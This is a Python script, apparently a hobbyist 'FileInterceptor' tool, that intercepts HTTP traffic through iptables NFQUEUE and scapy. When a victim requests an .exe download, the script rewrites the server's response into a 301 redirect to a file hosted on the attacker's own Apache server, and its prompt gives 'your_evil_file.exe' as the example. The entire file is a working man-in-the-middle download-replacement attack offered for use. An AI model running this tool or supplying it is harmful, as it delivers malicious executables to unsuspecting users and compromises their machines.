#!/usr/bin/env python
import scapy.all as scapy
import netfilterqueue
import os
import random
import subprocess
import re

ack_lst = []
random_queue=random.randint(0,100)
downloaded_file=""
colors = {'HEADER' : "\033[95m",
    'OKBLUE' : "\033[94m",
    'RED' : "\033[91m",
    'YELLOW' : "\033[93m",
    'GREEN' : "\033[92m",
    'LIGHTBLUE' : "\033[96m",
    'FAIL' : "\033[91m",
    'END' : "\033[0m",
    'BOLD' : "\033[1m",
    'UNDERLINE' : "\033[4m" }
print colors["YELLOW"]+" _____ _ _      ___       _                          _             "
print colors["YELLOW"]+"|  ___(_) | ___|_ _|_ __ | |_ ___ _ __ ___ ___ _ __ | |_ ___  _ __ "
print colors["OKBLUE"]+"| |_  | | |/ _ \| || '_ \| __/ _ \ '__/ __/ _ \ '_ \| __/ _ \| '__|"
print colors["RED"]+"|  _| | | |  __/| || | | | ||  __/ | | (_|  __/ |_) | || (_) | |"
print colors["GREEN"]+"|_|   |_|_|\___|___|_| |_|\__\___|_|  \___\___| .__/ \__\___/|_| "
print colors["GREEN"]+"                                              |_| "
print colors["GREEN"]+"         Instagram:https://www.instagram.com/aziz.kpln"
print colors["GREEN"]+"         Facebook:https://www.facebook.com/aziz.kaplan.96387"
print colors["GREEN"]+"         Github:https://www.github.com/AzizKpln/"
def ipconfiguration():
    global default_ip
    global file_name
    
    ipconfig=subprocess.check_output(["dmesg"])
    ipconfig=ipconfig.decode("utf-8")
    if "wlan0" in ipconfig:
        ipconfig_results=subprocess.check_output(["ifconfig","wlan0"])
        interface="wlan0"
    elif "eth0" in ipconfig:
        ipconfig_results=subprocess.check_output(["ifconfig","eth0"])
        interface="eth0"
    ipconfig_results=ipconfig_results.decode("utf-8")
    ipconfig_results=ipconfig_results.split(" ")
    for i in ipconfig_results:
        if i.startswith("1" or "0" or "2" or "3") and not "255" in i and "." in i: 
            default_ip=str(i)
    
    print colors["OKBLUE"]+"*"*50
    print colors["BOLD"]+colors["GREEN"]+"Input The Link That You Want To Replace Downloading With"
    print colors["GREEN"]+"Your "+interface+"'s Default Ip Address Is %s\n"%default_ip
    print colors["GREEN"]+"Example:"+colors["UNDERLINE"]+"http://%s/your_evil_file.exe"%default_ip+colors["END"]
    print colors["OKBLUE"]+"*"*50+colors["RED"]
    
    
    
    iptables_forward="iptables -I FORWARD -j NFQUEUE --queue-num %s"%random_queue
    os.system(iptables_forward)
def file_name(file_link):
    global f_name
    file_name=file_link.split("/")
    for i in file_name:
        if i.endswith(".exe"):
            f_name=i
    print colors["YELLOW"]+"\nNAME OF THE FILE IS:%s"%f_name
def deloptions(r_packet):
    del r_packet[scapy.IP].len
    del r_packet[scapy.IP].chksum
    del r_packet[scapy.TCP].chksum
    return r_packet
def replace_download(pkt):
    global raw_checker
    
    r_packet = scapy.IP(pkt.get_payload())
    if r_packet.haslayer(scapy.Raw):
        raw_checker=r_packet[scapy.Raw].load
        raw_checker=raw_checker.split(" ")
        for i in raw_checker:
            if ".exe" in i:
                print colors["YELLOW"]+colors["UNDERLINE"]+"[!][!][!]HE TRIED TO DOWNLOAD:'"+i+"' FILE."+colors["END"]
                downloaded_file=i.split("/")
                for j in downloaded_file:
                    if ".exe" in j:
                        d_file=str(j)
        
        
        if r_packet[scapy.TCP].dport == 80:
            print colors["GREEN"]+"[+] HTTP Request"
            if ".exe" in r_packet[scapy.Raw].load:
                print colors["GREEN"]+"[+]"+colors["OKBLUE"]+"Detected an exe download request"
                ack_lst.append(r_packet[scapy.TCP].ack)
                cp_command="mv /var/www/html/%s /var/www/html/%s"%(f_name,d_file)
                os.system(cp_command)
                os.system("service apache2 start")
        elif r_packet[scapy.TCP].sport == 80:
            print colors["GREEN"]+"[+] HTTP Response"
            if r_packet[scapy.TCP].seq in ack_lst:
                os.chdir("/var/www/html")
                exe_file=subprocess.check_output(["ls"])
                exe_file=exe_file.split("\n")
                for i in exe_file:
                    if i.endswith(".exe"):
                        e_file=str(i)
                changer_link="http://%s/%s"%(default_ip,e_file)
                ack_lst.remove(r_packet[scapy.TCP].seq)
                r_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\r\nLocation: " + str(changer_link) + "\n\n"
                os.system("iptables --flush")
                print colors["RED"]+colors["UNDERLINE"]+colors["BOLD"]+"[!][!][!]FILE CHANGED"+colors["END"]
                modified_pkt = deloptions(r_packet)
                pkt.set_payload(str(modified_pkt))

    pkt.accept()
try:
    ipconfiguration()
    file_link=raw_input("--->")
    file_name(file_link)
    nfqueue = netfilterqueue.NetfilterQueue()
    nfqueue.bind(random_queue, replace_download)
    nfqueue.run()
except KeyboardInterrupt:
    print colors["RED"]+colors["UNDERLINE"]+"\n\n[+] Detected 'CTRL + C' ... Quitting ...!!!"
